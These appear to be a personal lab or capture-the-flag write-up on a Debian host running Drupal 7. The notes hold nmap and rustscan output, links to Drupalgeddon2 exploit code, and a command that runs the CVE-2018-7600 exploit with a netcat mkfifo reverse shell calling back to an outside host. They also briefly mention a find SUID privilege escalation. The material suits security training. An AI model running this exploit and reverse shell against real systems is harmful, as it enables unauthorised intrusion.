Linux ttl=61

# rustscan

```
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 61
80/tcp    open  http    syn-ack ttl 61
111/tcp   open  rpcbind syn-ack ttl 61
42760/tcp open  unknown syn-ack ttl 61
```

# nmap

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34978/tcp6  status
|   100024  1          36464/udp6  status
|   100024  1          42760/tcp   status
|_  100024  1          51413/udp   status
42760/tcp open  status  1 (RPC #100024)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 3.8 (91%), Linux 3.8 (91%), WatchGuard Fireware 11.8 (91%), Linux 3.2.0 (90%), Linux 3.1 - 3.2 (90%), Linux 2.6.36 (89%), Linux 2.6.32 - 2.6.39 (89%), Linux 3.5 (88%), Linux 3.0 - 3.2 (88%), Grandstream GXV3275 video phone (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# initial

### drupal 7

Droopescan (will add github or something here)

https://github.com/lorddemon/drupalgeddon2

https://github.com/pimps/CVE-2018-7600

used 7600.py with nc mkfifo

```
python3 drupa7-CVE-2018-7600.py http://192.168.161.193/ -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.214 80 >/tmp/f'
```


# priv esc

was interesting but `find` SUID got attention!!

![[Pasted image 20240613193646.png]]